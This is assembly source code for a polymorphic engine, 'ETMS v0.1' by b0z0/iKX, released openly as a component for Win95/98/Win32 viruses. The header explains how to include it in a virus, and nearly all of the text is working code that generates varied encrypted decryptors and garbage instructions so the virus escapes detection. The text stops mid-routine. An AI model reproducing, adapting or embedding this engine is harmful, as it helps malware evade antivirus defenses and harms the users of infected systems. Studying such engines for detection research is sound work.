;                      - expressway to my skull -
;                             [ETMS]  v0.1
;                              -b0z0/iKX-
;
; Intro:
;  This is a polymorphic engine for Win95/98/32 based viruses. It (not sure
; about this anyway) creates quite polymorphic decryptors that could be used
; to hide your virus or something else. Skip some lines to get a tech
; description and try to generate a few samples to see what it can do.
;  Somebody could ask which is the sense of such a name for a poly. The answer
; is simple: should there be a reason for everything? I find a lot of things
; totally nonsense, so why should poly engines have a name that could fit for
; a poly engine? I just felt like using this name for my poly and I did so. It
; is somewhat a change from the title of a Sonic Youth song named 'Expressway
; to yr skull' (named also 'The Crucifixion of Sean Penn' or 'Madonna, Sean and
; me'), a song that I like and that I found very near when I was writing this
; poly engine.
;
; Features:
;   Basic features:
;       - Encryption using XOR/ADD/SUB/ROL/ROR on bytes/words/dwords with
;         either fixed (fixed immediate or fixed reg) or changing key
;       - Can use all registers as pointers, counters and key holders
;       - Can encrypt from start to end and from end to beginning
;       - Can create memory reference with offset (ie. [ECX + 1234h])
;       - Counter with random costants added, counts both decrementing or
;         incrementing its value
;       - Key change using XOR/ADD/SUB/ROL/ROR/INC/DEC on bytes/words/dwords
;         of the key register
;       - Quite some different ways of counting loop
;       - Some garbage is encrypted aswell
;       - Lenght of generated decryptors range somewhere between 400
;         bytes up to 4kbs
;
;   Garbage:
;       - All the normal math, logical and comparation operations and
;         assignations on registers, immediates and memory references
;       - Moving and exchanging of registers
;       - Push of regs/imms/mem_data, pop to regs
;       - Creation of fake subroutines
;       - Conditional and unconditional jumps
;       - Usual one byte opcodes
;       - Temporary saves somewhere (to another register or to stack) important
;         registers (such as key, counter and pointer) and makes garbage with
;         them.
;       - More or less all the usual code you could find around in normal
;         programs, excepts memory writes and such. Anyway you'd better give a
;         look to some decryptors, it is not easy to write too deeply what it
;         does.
;
;
; Using the poly:
;   Just add the ETMS source in your virus, simply:
;     include         etms.asm
;   Set the registers as described below and then call the poly. The poly uses
;  some data for internal purposes. This data of course is not needed to be
;  carried around with your infected file or whatever. You can just include
;  the ETMS source at the end of the file and then skip the bytes that start
;  from the label _mem_data_start. Of course you'll need to have that free
;  memory placed there at runtime.
;   The random seed (the dd at seed) should be initialized at first poly
;  run to a value between 0 and 714024.
;
;    Calling parameters:
;       ECX     =       Lenght of things to be encrypted
;       ESI     =       Pointer to what we want to encrypt
;       EDI     =       Where to place decryptor and encrypted stuff
;       EBP     =       Offset at which decryptor will run
;
;    On exit:
;       EDI     =       Pointer to generated code
;       ECX     =       Lenght of generated code (decryptor + encrypted code)
;
; Note:
;  I tried to write the poly quite clearly adding quite some comments.
; Nevertheless in some parts the code could be a bit messy or strange since
; I tried to optimize it at least a bit (like converting most of direct
; memory 32bit references to a reference [reg + off8] that are much shorter).
; I apologize for some quite messy code and if you have some problems
; understanding something, please contact me.
;
; Contacts:
;  For any question, comment or whatever about the poly or about whatever feel
; free to mail me at cl0wn@geocities.com.
;
;

poly:
        cld
        push    edi
        push    edi

        call    poly_delta
poly_delta:
        pop     eax                     ; where we are running
        sub     eax,offset poly_delta
        push    eax

        lea     ebx,[offset t_inipnt + eax]

o_tini  equ     offset t_inipnt         ; save some bytes since off between
                                        ; various data is a 8b

        mov     dword ptr [ebx],edi
        mov     dword ptr [ebx - (o_tini - offset v_lenght)],ecx
        mov     dword ptr [ebx - (o_tini - offset v_virusp)],esi
        mov     dword ptr [ebx - (o_tini - offset v_runnin)],ebp

        mov     dword ptr [ebx - (o_tini - offset r_pointer)],010ffffffh
        mov     dword ptr [ebx - (o_tini - offset t_chgpnt)],01000404h

        xor     eax,eax
        mov     dword ptr [ebx - (o_tini - offset t_fromend)],eax
        mov     dword ptr [ebx - (o_tini - offset t_pntoff)],eax
        mov     dword ptr [ebx - (o_tini - offset t_cntoff)],eax
        mov     dword ptr [ebx - (o_tini - offset t_inacall) - 2],eax

        xor     cl,cl
bit_loop:
        shl     ebp,1
        jc      founded_first1                  ; find higher bit with an 1
        inc     cl                              ; for random memory offsets
        jmp     bit_loop
founded_first1:
        mov     byte ptr [ebx - (o_tini - offset t_memand)],cl

        pop     ebp                             ; delta

        push    edi
        mov     al,90h
        lea     edi,[offset enc_space + ebp]
        mov     dword ptr [ebx - (o_tini - offset w_encrypt)],edi
        mov     ecx,enc_max
        rep     stosb
        pop     edi

        call    rnd_garbage

        mov     ecx,3
        lea     esi,[offset r_pointer + ebp]

init_part:
        push    ecx
select_register:
        call    get_register                    ; get a unused register
        xchg    eax,ecx

        call    set_used                        ; mark as unusable in future
        xchg    eax,ebx

select_block:
        call    get_random_al7
        and     al,011b
        jz      select_block                    ; select from 01 to 03

        dec     eax
        cmp     byte ptr [eax+esi],0ffh         ; check if that stage already
        jne     select_block                    ; done

        mov     byte ptr [eax+esi],bl           ; save the register for that
                                                ; stage
        or      al,al
        jnz     not_pointer

        mov     dword ptr [esi - (offset r_pointer - offset w_pointer)],edi
                                                ; save offset where the
                                                ; pointer is initialized
        jmp     assign_next

not_pointer:
        dec     eax
        jnz     not_counter

        mov     dword ptr [esi - (offset r_pointer - offset w_counter)],edi
        jmp     assign_next                     ; assign inital counter

not_counter:

        call    get_random                      ; get key
        mov     dword ptr [esi - (offset r_pointer - offset v_initkey)],eax
        xchg    eax,ecx

        call    get_random
        and     al,1
        jz      assign_next                     ; if so use key
        call    unset_used
        mov     byte ptr [esi+2],20h            ; don't use key
        jmp     next_loop
assign_next:
                ; BL  register
                ; EAX value
        xchg    eax,ebx                 ; in bl register
        or      al,0b8h                 ; mov base
        stosb
        xchg    eax,ecx
        stosd                           ; the value

next_loop:
        call    rnd_garbage
        pop     ecx
        loop    init_part               ; make all init steps


; now some base assignment to a pointer, counter and key (if used) registers
; has been done. here we are gonna change a bit the various registers where
; the various things has been assigned
        call    get_random_al7
        and     al,011b                 ; from 0 to 3 moves
        jz      decryptor_build_start
        xchg    eax,ecx
reg_movida:
        push    ecx
get_whichone:
        call    select_save             ; select which to change (pnt,cnt,key)
        jc      leave_this_out

        call    save_mov_xchg           ; change the regs using mov or xchg
        mov     byte ptr [edx],al
leave_this_out:
        pop     ecx
        loop    reg_movida

decryptor_build_start:
; decryptor loop begins right here

        lea     esi,[offset t_chgpnt + ebp]
        mov     dword ptr [esi - (offset t_chgpnt - offset w_loopbg)],edi

        call    get_random              ; select if starting from head or from
        and     ax,0101h                ; tail and if counter will dec or inc
        mov     word ptr [esi - (offset t_chgpnt - offset t_fromend)],ax

        xchg    eax,edx                 ; rnd in edx

        shl     edx,1                   ; add a constant to counter?
        jnc     normal_counter
        call    get_random
        mov     dword ptr [esi - (offset t_chgpnt - offset t_cntoff)],eax
normal_counter:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_pointer)],05h
                                        ; no bp + off
        je      reget_size_op

        shl     edx,1                   ; select if use only pointer or
        jc      reget_size_op           ; pointer + offset
        call    get_random              ; select random offset
        mov     dword ptr [esi - (offset t_chgpnt - offset t_pntoff)],eax
                                        ; if using get offset
reget_size_op:
        call    get_random
        mov     edx,eax
        and     eax,0fh                 ; select math operation and size
        or      eax,eax                 ; of operand
        jz      reget_size_op

;      byte  word  dword
; ror   1     6     b
; sub   2     7     c
; xor   3     8     d
; add   4     9     e
; rol   5     a     f
;
no_rorrrpr:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],03
                                        ; if not ax,cx,dx,bx then can't be byte
        jb      can_use_all             ; as key
        cmp     al,6                    ; is byte? get another
        jb      reget_size_op

can_use_all:
        xor     ecx,ecx
        mov     cl,9
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        je      no_keychanges

        shr     edx,8                   ; edx has rnd
        and     edx,011b
        mov     byte ptr [esi - (offset t_chgpnt - offset t_chgkey)],dl
        add     ecx,edx

no_keychanges:
        cmp     al,0bh
        jae     ok_counts
        sub     ecx,4d                  ; if with words 4 inc/dec less
        sub     word ptr [esi],0202h
        cmp     al,06d
        jae     ok_counts
        dec     ecx                     ; for bytes even less
        dec     ecx
        sub     word ptr [esi],0101h

ok_counts:
        push    eax
        call    rnd_garbage
get_nextseq:
        call    get_random
        and     eax,011b
        xchg    eax,edx
        cmp     byte ptr [esi+edx],0
        je      get_nextseq
        dec     byte ptr [esi+edx]
        shl     edx,2                   ; offset = * 4
        sub     edx,(offset t_chgpnt - offset o_table)
        pop     eax
        push    eax
        push    ecx
        push    esi
        mov     ecx,dword ptr [esi+edx]
        add     ecx,ebp
        call    ecx                     ; call the routine to do it
        pop     esi
        pop     ecx
        pop     eax
        loop    ok_counts

; finished decryption loop, needs comparation and jumps
        call    rnd_garbage

        xor     eax,eax
        inc     eax
        mov     ecx,dword ptr [esi - (offset t_chgpnt - offset t_cntoff)]
        or      ecx,ecx
        jnz     must_compare

get_checker:
        call    get_random
        and     eax,0fh
        cmp     al,09d
        ja      get_checker
must_compare:
        shr     al,1
        pushf
        mov     ah,byte ptr [eax + offset chk_counter + ebp]   ; get comparer
        add     ah,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
        mov     al,81h
        popf
        jc      store_d00
        inc     eax
        inc     eax
        stosw
        xor     al,al
        stosb
        jmp     make_jumps
store_d00:
        stosw
        xchg    eax,ecx
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_countback)],00h
        je      not_negcnt1
        neg     eax
not_negcnt1:
        stosd
make_jumps:
        call    get_random
        ror     al,1
        jc      do_withlong
        stosw

        call    make_jmpback            ; do jump back, in EAX lenght of jump

        cmp     eax,7fh                 ; max short jump offset
        jb      ok_offsetj
        mov     edi,ebx                 ; if > then redo from start
        dec     edi
        dec     edi
        jmp     make_jumps
ok_offsetj:
        mov     ah,74h                  ; jne + offset
        xchg    al,ah
        mov     word ptr [ebx-2],ax
        jmp     done_cond
do_withlong:
        mov     ax,840fh                ; jz long
        stosw
        stosd
        call    make_jmpback            ; do jump back, in EAX lenght of jump

        mov     dword ptr [ebx-4],eax     ; store the lenght
done_cond:


; now decryption loop generation is finished
        lea     esi,[offset v_lenght + ebp]
        mov     byte ptr [esi - (offset v_lenght - offset r_used)],10h
                                        ; can use all regs (except ESP) again

        call    rnd_garbage             ; unencrypted one, some more here
        call    rnd_garbage

        push    edi
        call    rnd_garbage                     ; encrypted garbage
        pop     ecx
        neg     ecx
        add     ecx,edi                 ; how much encrypted garbage

        mov     edx,ecx
        sub     edi,edx

        add     ecx,dword ptr [esi]

        shr     ecx,2                   ; so it will be enough for b/w/d enc
        inc     ecx
        shl     ecx,2

        pop     eax
        neg     eax
        add     eax,edi                         ; lenght of decryptor
        add     eax,dword ptr [esi - (offset v_lenght - offset v_runnin)]
                                                ; running offset
        mov     ebx,dword ptr [esi - (offset v_lenght - offset w_pointer)]
        cmp     byte ptr [esi - (offset v_lenght - offset t_fromend)],00h
        pushf
        je      no_adding
        add     eax,ecx                         ; from end
no_adding:
        sub     eax,dword ptr [esi - (offset v_lenght - offset t_pntoff)]
                                                ; - pointer offset if is there
        mov     dword ptr [ebx+1],eax           ; set initial pointer

        mov     ebx,dword ptr [esi - (offset v_lenght - offset w_counter)]
        inc     ebx
        mov     eax,dword ptr [esi - (offset v_lenght - offset t_cntoff)]
        add     eax,ecx
        mov     dword ptr [ebx],eax

        cmp     byte ptr [esi - (offset v_lenght - offset t_countback)],00h
        je      not_negcnt
        neg     dword ptr [ebx]

not_negcnt:

        mov     esi,dword ptr [esi - (offset v_lenght - offset v_virusp)]

        mov     ebx,edi                 ; pointer on code to encrypt
        add     edi,edx                 ; + encrypted garbage
        popf
        je      no_adding2
        add     ebx,ecx                 ; add lenght if from end

no_adding2:

        push    ecx
        sub     ecx,edx
        rep     movsb                   ; copy what to encrypt
        pop     edx

        db      0b9h                    ; mov ecx
v_initkey       dd      00h             ; initial key value

enc_max equ     20h
; lenghts
; 6     = max encryption operation
; 4     = max 4 inc/dec counter
; 4     = max 4 inc/dec counter
; 3 * 6 = max 3 * 6 byte key change operations

enc_space:
        db      enc_max dup (90h)       ; here the encryptor will be placed
        or      edx,edx
        jnz     enc_space               ; loop

        mov     ecx,edi
        pop     edi
        sub     ecx,edi                 ; total lenght
        ret                             ; poly finished
; - ETMS return point

poly_name       db      '[ETMS] v0.1 -b0z0/iKX-',0

make_jmpback:
        push    edi

        call    rnd_garbage

        mov     al,0e9h
        stosb
        mov     eax,dword ptr [esi - (offset t_chgpnt - offset w_loopbg)]
                                                ; the jump back to start of
        sub     eax,04h                         ; the decryptor
        sub     eax,edi
        stosd

        call    rnd_garbage

        pop     eax
        mov     ebx,eax
        neg     eax
        add     eax,edi                 ; calculate lenght of jump and return
        ret                             ; with it

put_encloop_2:
        push    ecx
        xor     ecx,ecx
        inc     ecx
        inc     ecx
        jmp     short put_encloop
put_encloop_1:
        push    ecx
        xor     ecx,ecx
        inc     ecx
put_encloop:
; ecx nr of bytes
        push    eax
        xchg    edi,dword ptr [w_encrypt+ebp]   ; in EDI where we are in enc
                                                ; and save dec position
copy_it:
        stosb
        shr     eax,8
        loop    copy_it
        xchg    dword ptr [w_encrypt+ebp],edi   ; save next and restore dec pnt
        pop     eax
        pop     ecx
        ret

o_table:
o_counter       dd      offset ch_counter
o_pointer       dd      offset ch_pointer
o_key           dd      offset ch_key
o_mate          dd      offset ch_mate

ch_counter:                             ; decrement/increment counter
        mov     al,48h                  ; dec
        push    eax
        or      al,02h                  ; counter in enc uses EDX
        call    put_encloop_1
        pop     eax
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_countback)],00h
        je      decrementing
        sub     al,08h                  ; else incrementing counter
decrementing:
        or      al,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
        stosb
        ret

ch_pointer:                             ; increment/decrement pointer
        mov     al,40h                  ; inc
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_fromend)],00h
        je      straight_up
        add     al,08h
straight_up:
        push    eax
        or      al,03h                  ; ebx
        call    put_encloop_1
        pop     eax
        or      al,byte ptr [esi - (offset t_chgpnt - offset r_pointer)]
        stosb
        ret

ch_key:                                 ; change key register
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        je      exit_keychange
get_modifier:
        call    get_random_al7
        cmp     al,6
        ja      get_modifier
        mov     cl,al
        mov     ah,byte ptr [eax + offset key_changers + ebp]
        mov     al,81h          ; add/sub/xor base
        cmp     cl,3
        jb      no_rrrr
        mov     al,0c1h         ; rol/ror base
no_rrrr:
        push    eax
reget_ksize:
        call    get_random      ; select if byte/word/dword
        and     al,011b
        jz      reget_ksize
        cmp     cl,04h          ; inc dec just on dw and dd
        jb      isntincdec
        cmp     al,01h
        je      reget_ksize
isntincdec:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],3
        jbe     canall
        cmp     al,01b          ; byte keychange only for ax,cx,dx,bx
        je      reget_ksize
canall:
        mov     ch,al
        pop     eax
        cmp     ch,01h
        jne     no_decbyte
        dec     al
no_decbyte:
        cmp     ch,02h
        jne     no_wordprefix
        push    eax
        mov     al,66h
        stosb
        call    put_encloop_1
        pop     eax
no_wordprefix:
        cmp     cl,05h
        pushf
        jb      no_incdecch             ; inc/dec has just one byte opcode
        dec     edi
        mov     al,byte ptr [edi]
no_incdecch:
        popf
        push    eax
        jb      no_nopneeded
        mov     al,ah
        or      al,1            ; ecx key in enc loop
        call    put_encloop_1   ; for inc/dec
        jmp     short after_store
no_nopneeded:
        or      ah,1            ; key is ECX in enc loop
        call    put_encloop_2
after_store:
        pop     eax
        or      ah,byte ptr [esi - (offset t_chgpnt - offset r_regkey)]
        stosw
        cmp     cl,05           ; inc/dec doesn't need any key
        jae     exit_keychange
        call    get_random
        cmp     cl,03
        jae     just_one_bk     ; ror/rol just one byte key
        cmp     ch,01h
        je      just_one_bk     ; check dimension of key modifier
        stosb
        call    put_encloop_1
        shr     eax,8h
        cmp     ch,02h
        je      just_one_bk
        stosw
        call    put_encloop_2
        shr     eax,10h
just_one_bk:
        stosb
        call    put_encloop_1
exit_keychange:
        ret

ch_mate:                        ; creates the decryption math operation
        xor     edx,edx
        mov     ecx,5h
type_sel:
        cmp     eax,ecx
        jbe     ok_regs
        inc     edx
        sub     eax,ecx
        jmp     type_sel        ; get type and size.. in EDX size, in EAX type
                                ; edx = 0 for byte, 1 for word, 2 for dword
ok_regs:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        lea     esi,[offset _math_imm + ebp]
        je      without_key
        add     esi,(offset _math_key - offset _math_imm)
without_key:
        dec     eax             ; type - 1
        push    esi
        push    eax
        shl     eax,1           ; each type is a word
        add     esi,eax
        lodsw                   ; ax = mathop word

        cmp     dl,1
        jne     not_word
        push    eax
        mov     al,066h
        stosb
        call    put_encloop_1
        pop     eax
not_word:
        or      dl,dl
        jnz     not_byte
        dec     al
not_byte:
        pop     ebx             ; type - 1
        pop     esi             ;

        push    ebx

        push    eax
        neg     ebx
        add     ebx,4           ; get opposite math operation
        shl     ebx,1
        add     esi,ebx
        lodsw

        lea     esi,[offset r_regkey + ebp]
        cmp     byte ptr [esi],20h
        je      ok_regskey
        cmp     al,0d3h
        je      ok_regskey
        add     ah,08h          ; since ECX is used as key
ok_regskey:
        or      dl,dl
        jnz     not_byterev
        dec     al
not_byterev:
        add     ah,03h          ; in enc loop using EBX
        call    put_encloop_2
        pop     eax

        mov     cl,byte ptr [esi - (offset r_regkey - offset r_pointer)]
        cmp     cl,03h          ; eax-ebx
        ja      upper_ones
        add     ah,cl
        jmp     ok_register_p
upper_ones:
        add     ah,06h
        cmp     cl,06h          ; esi
        je      ok_register_p
        inc     ah
        cmp     cl,07h          ; edi
        je      ok_register_p
        add     ah,03eh         ; ebp
ok_register_p:

        pop     ecx             ; type-1

        cmp     dword ptr [esi - (offset r_regkey - offset t_pntoff)],0
        je      not_plusoff
        add     ah,80h
not_plusoff:
        stosw

        xor     eax,eax

        cmp     byte ptr [esi],20h    ; using key?
        je      ok_register_k

        or      cl,cl
        je      check_rr
        cmp     cl,4
        jne     not_rol_ror
check_rr:
        cmp     byte ptr [esi],1   ; is key CX (cl)
        je      ok_register_k
        mov     al,10h                  ; if not put just immediate
        sub     byte ptr [edi-2],12h

        mov     ebx,dword ptr [esi - (offset r_regkey - offset w_encrypt)]
        sub     byte ptr [ebx-2],12h

        push    ecx
        mov     bl,20h
        xchg    bl,byte ptr [esi]       ; won't use key reg anymore in the
        call    unset_used              ; future, so use for garbage
        pop     ecx
        jmp     short ok_register_k

not_rol_ror:
        mov     al,byte ptr [esi]
        shl     eax,3                   ; * 8
        add     byte ptr [edi-1],al     ; key register

ok_register_k:
        cmp     byte ptr [esi - (offset r_regkey - offset r_pointer)],05h
        jne     not_usingbp
        mov     byte ptr [edi],00h
        inc     edi
not_usingbp:

        mov     eax,dword ptr [esi - (offset r_regkey - offset t_pntoff)]
        or      eax,eax
        jz      no_offsetadd
        stosd
no_offsetadd:
        cmp     byte ptr [esi],20h
        jne     no_key_needed

        mov     eax,dword ptr [esi - (offset r_regkey - offset v_initkey)]
        or      cl,cl
        je      byte_key
        cmp     cl,4
        je      byte_key
        or      dl,dl
        je      byte_key

        stosb
        call    put_encloop_1

        shr     eax,8
        dec     dl
        jz      byte_key
        stosw
        call    put_encloop_2
        shr     eax,10h
byte_key:
        stosb
        call    put_encloop_1

no_key_needed:
        ret

rnd_garbage:
        push    ecx
        push    eax
        call    get_random
        and     eax,0fh         ; max - 1
        inc     eax             ; not zero
        xchg    eax,ecx

garbager:
; ecx how many
        push    edx
        push    ebx
garbager_loop:
        push    ecx
get_op_type:
        call    get_random      ; how many possible types
        and     eax,0fh

        mov     ecx,[(eax*4)+offset garbage_offsets+ebp]
        add     ecx,ebp
        call    ecx                     ; call garbage routine
        pop     ecx
        loop    garbager_loop

        mov     eax,dword ptr [t_pushed+ebp]

        cmp     eax,000005h     ; if not in a call, not in a jump and
        ja      stack_is_ok     ; pushed <=5

        or      eax,eax
        jz      stack_is_ok

        inc     byte ptr [t_inacall+ebp]

        cmp     al,01h
        ja      direct_addesp
        call    do_pop_nocheck
        jmp     stack_is_ok

direct_addesp:
        push    eax             ; then correct stack
        mov     ax,0c483h       ; add esp,nr_dd * 4
        stosw
        pop     eax
        call    force_popall
stack_is_ok:
        pop     ebx
        pop     edx

        pop     eax
        pop     ecx
        ret


do_push:
        cmp     byte ptr [t_pushed+ebp],05h     ; max dwords on the stack
        ja      exit_pusher
        inc     byte ptr [t_pushed+ebp]
        call    get_random              ; 4 types of pushing
        and     al,011b
        jz      push_register           ; normal push reg
        dec     al
        jz      push_immediate_dd       ; push immediate double
        dec     al
        jz      push_immediate_by       ; push immediate byte

        mov     ax,35ffh                ; push immediate from memory
        stosw
        call    get_address
        jmp     pre_exit_dd

push_immediate_by:
        mov     al,6ah
        stosb
        call    get_random
        shr     al,1
        jc      zero_or_menouno
        call    get_random              ; normal push as byte
        jmp     pre_exit_pusher

zero_or_menouno:                        ; very usual pushes
        and     al,01b                  ; so we will get 0 or -1
        dec     al                      ; to LARGE 0 or to LARGE -1
        jmp     pre_exit_pusher

push_immediate_dd:
        mov     al,68h
        stosb
        call    get_random
pre_exit_dd:
        stosd                           ; normal push as double
        jmp     exit_pusher

push_register:
        call    get_random_al7
        add     al,050h
pre_exit_pusher:
        stosb
exit_pusher:
        jmp     exit_ppc

do_pop:
        cmp     byte ptr [t_pushed+ebp],00h
        je      return_nopop
do_pop_nocheck:
        call    get_random
        shr     al,1
        jnc     popintoreg2
        mov     ax,0c483h       ; add esp,
        stosw
get_number:
        call    get_random_al7
        jz      get_number
        cmp     al,byte ptr [t_pushed+ebp]
        ja      get_number
force_popall:
        sub     byte ptr [t_pushed+ebp],al
        shl     al,2            ; dd are pushed, so * 4
        jmp     store_ngo2
popintoreg2:
        call    get_register
        add     cl,058h         ; pop in a register
        xchg    eax,ecx
        dec     byte ptr [t_pushed+ebp]
store_ngo2:
        stosb
return_nopop:
        jmp     exit_ppc

call_subroutines:
        cmp     word ptr [t_maxjmps+ebp],0h      ; don't nest too much nor
        jne     just_exit_call                   ; put pushes/pops in subs and
                                                 ; we can't know wassup in
                                                 ; conditional jumps and such

        inc     byte ptr [t_inacall+ebp]

        call    get_random_al7
        cmp     al,01h          ; 00h and 01h push
        jbe     do_push
        cmp     al,05           ; 02h - 05h pops (more probable so final stack
        jbe     do_pop          ; correction should be needed less often)

        ; 06,07 do a call
        mov     al,0e8h
        stosb
        stosd           ; place for offset

        push    edi
        call    rnd_garbage
        pop     ebx

        mov     al,0e9h
        stosb
        stosd                   ; jump offset
        push    edi
        call    rnd_garbage

        push    ebx
        neg     ebx
        add     ebx,edi
        xchg    eax,ebx
        pop     ebx

        mov     dword ptr [ebx-4],eax   ; call offset

        call    rnd_garbage    ; this is the called "subroutine"

        call    get_random      ; more ways of getting back from subroutine,
        shr     al,1            ; either with normal ret or by correcting the
        jnc     normal_ret      ; stack by popping or by adding to esp
        shr     al,1
        jnc     popintoreg
        mov     ax,0c483h       ; add esp,
        stosw
        mov     al,4
        jmp     store_ngo
popintoreg:
        call    get_register
        add     cl,058h         ; pop base
        xchg    eax,ecx
        jmp     store_ngo
normal_ret:
        mov     al,0c3h         ; ret
        stosb
        call    get_random_al7
        cmp     al,3
        ja      no_ccs
        xchg    eax,ecx
        mov     al,0cch         ; int3, usual after subroutines in win32s
        rep     stosb
store_ngo:
        stosb
no_ccs:
        call    rnd_garbage

        pop     ebx             ; jump offset

        push    ebx
        neg     ebx
        add     ebx,edi
        xchg    eax,ebx
        pop     ebx

        mov     dword ptr [ebx-4],eax
exit_ppc:
        dec     byte ptr [t_inacall+ebp]
just_exit_call:
        ret

maths_immediate_short:
        stc
        jmp     maths_immediate_1

maths_immediate:
        clc
maths_immediate_1:
        pushf
        call    get_random_al7 ; 0 to 7
        shl     al,3           ; * 8
        add     al,0c0h        ; the base
        popf
        push    eax
        pushf
        call    get_register
        add     al,cl
        mov     ah,81h          ; prefix
        popf
        pushf
        jnc     not_a_shortone
        inc     ah
        inc     ah
not_a_shortone:
        xchg    ah,al
        stosw
        call    g_dimension
        popf
        jnc     not_a_shortone2
        mov     cl,01h
not_a_shortone2:
        call    put_immediates
        pop     eax
        cmp     al,0f8h         ; is a CMP
        jne     not_compare
make_jmp_after_cmp:
        call    get_random
        and     eax,01b         ; long or short jump
        add     al,06h          ; short jump
        jmp     make_jump
not_compare:
        ret

cdq_jmps_savestack:
        call    get_random_al7
        sub     al,3
        jc      exit_c_j_ss
        xchg    eax,ecx
        mov     al,byte ptr [ecx+offset change_jump+ebp]
        cmp     cl,1
        ja      not_cdq_cbw

        test    byte ptr [r_used+ebp],0101b ; EAX and EDX for cbw,cwd,cdq,cwde
        jnz     exit_c_j_ss
        stosb
        inc     edi
        call    g_dimension
        dec     edi
        jmp     exit_c_j_ss
not_cdq_cbw:
        cmp     cl,4
        je      pushandmov
        add     cl,4                    ; this is used for dimension
        jmp     do_that_fjump           ; do as for conditional ones
pushandmov:

        call    select_save
        jc      exit_c_j_ss

        xchg    eax,ebx
        mov     al,50h                  ; push

        xor     ch,ch                   ; so it won't be erased from stack
        xchg    ch,byte ptr [t_pushed+ebp]

        push    ecx
        call    unset_used              ; mark that as unused one
        add     al,bl                   ; push the reg
        stosb
        call    rnd_garbage
        add     al,08h          ; pop opcode
        stosb

        pop     ebx
        mov     byte ptr [t_pushed+ebp],bh
        mov     byte ptr [r_used+ebp],bl
exit_c_j_ss:
        ret


gen_one_byters:
        call    get_random_al7
make_jump:
        mov     cl,al
        mov     al,byte ptr [eax+offset one_byters+ebp]   ; get onebyter
        cmp     cl,05h
        jbe     not_jump
do_that_fjump:
        cmp     byte ptr [t_maxjmps+ebp],3        ; don't nest too much
        je      just_exit
        inc     byte ptr [t_maxjmps+ebp]

        cmp     al,0e9h                 ; for unconditional ones skip some
        jae     skip_unc                ; things

        cmp     cl,07h
        jne     not_longjump
        push    eax
        mov     al,0fh                  ; long prefix
        stosb
        pop     eax
not_longjump:
        push    eax
        call    get_random
        and     al,0fh
        mov     ch,al
        pop     eax
        add     al,ch
skip_unc:
        stosb                           ; type of jump
        stosb                   ; first off
        cmp     cl,07h
        jne     not_longone
        dec     edi
        stosd
not_longone:
        push    edi
        call    rnd_garbage
        pop     ebx
        mov     eax,edi
        sub     eax,ebx                 ; offset of jump
        dec     byte ptr [t_maxjmps+ebp]
        cmp     cl,7
        je      long_jumper
        cmp     eax,7fh                 ; if not too big then use it
        jb      good_jump
        mov     edi,ebx                 ; else forget everything
        dec     edi
        dec     edi
        ret
good_jump:
        mov     byte ptr [ebx-1],al
        ret
long_jumper:
        mov     dword ptr [ebx-4],eax
        ret
not_jump:
        stosb
just_exit:
        ret

mem_assign:
        mov     ax,058bh
        jmp     mem_common

mem_mathops:
        call    get_random_al7  ; 0 to 7
        shl     al,3
        add     al,03h          ; base
mem_common:
        push    eax
        call    get_register
        shl     cl,3            ; *8
        add     cl,05h          ; base for eax
        mov     ah,cl
        stosw
        call    g_dimension

; now offset
        call    get_address
        stosd
        pop     eax
        cmp     al,3bh                  ; is a cmp
        je      make_jmp_after_cmp      ; if so force a compare
        ret


mov_registers:
        call    get_random_al7          ; random source
        add     al,0c0h
        mov     ah,08bh
        call    get_register            ; useful dest
        shl     cl,3
        add     al,cl
        xchg    ah,al
        stosw
        jmp     g_dimension

maths_registers:
        call    get_random_al7
        shl     al,3
        add     al,03h         ; base
        mov     ah,0c0h         ; suff
        push    eax

        call    get_register    ; dest
        shl     cl,03h
        add     ah,cl

        xchg    eax,ecx             ; save temp in ecx
        call    get_random_al7      ; all regs
        xchg    eax,ecx             ; reg in ECX and restore EAX

        add     ah,cl
        stosw

        call    g_dimension
        pop     eax
        cmp     al,3bh
        je      make_jmp_after_cmp
        ret

rotating_imms:
        call    get_random_al7
        cmp     al,0110b                ; 0f0 doesn't exist
        je      rotating_imms
        shl     al,3                    ; *8
        add     al,0c0h

        call    get_register
        add     al,cl
        mov     ah,0c1h
        xchg    al,ah
        stosw
        call    g_dimension
        xor     ecx,ecx
        inc     cl
        jmp     put_immediates

notneg_register:
        call    get_random
        shr     al,1
        mov     ax,0d0f7h
        jc      not_add
        add     ah,08h
not_add:
        call    get_register
        add     ah,cl
        stosw
;        jmp     g_dimension

g_dimension:
; EDI after generated garb
reget_dim:
        call    get_random
        and     eax,010b        ; 0 or 2
        jnz     no_change
word_change:
        mov     ecx,dword ptr [edi-2]
        mov     byte ptr [edi-2],66h    ; the prefix
        mov     dword ptr [edi-1],ecx
        inc     edi
no_change:
        inc     eax
        inc     eax
        xchg    eax,ecx                 ; in ECX needed immediates
        ret

imm_assign:
        call    get_register
        mov     al,0b8h         ; base
        add     al,cl
        stosb
        inc     edi
        call    g_dimension
        dec     edi
;        jmp     put_immediates

put_immediates:
; cl how many
        call    get_random
put_imm_part:
        stosb
        shr     eax,8
        loop    put_imm_part
        ret

inc_dec_reg:
        call    get_random
        and     al,01b
        shl     al,3                    ; * 8, so will be 0 or 8
        add     al,40h                  ; incdec generation
        call    get_register
        add     al,cl
        stosb
        inc     edi
        call    g_dimension
        dec     edi
        ret

xchg_regs:
        mov     ax,0c087h               ; xchg eax,eax
        call    get_register
        add     ah,cl
        call    get_register
common_test_xchg:
        shl     cl,3
        add     ah,cl
        stosw
        jmp     g_dimension

test_regs:
        mov     ax,0c085h               ; test eax,eax
        push    eax
        call    get_random_al7
        mov     ch,al
        call    get_random_al7
        mov     cl,al
        pop     eax
        add     ah,ch
        jmp     common_test_xchg

temp_save_change:
        call    get_random_al7
        sub     al,6                    ; 1/4 probability, since this couldn't
        jc      skip_changer            ; come too often

        call    select_save
        jc      skip_changer

        push    ecx
        call    save_mov_xchg

        xchg    eax,ecx                 ; in al new register
        mov     al,byte ptr [edx]       ; imp_reg
        shl     al,3
        xchg    eax,ecx
        add     al,cl
        or      al,0c0h
        xchg    al,ah
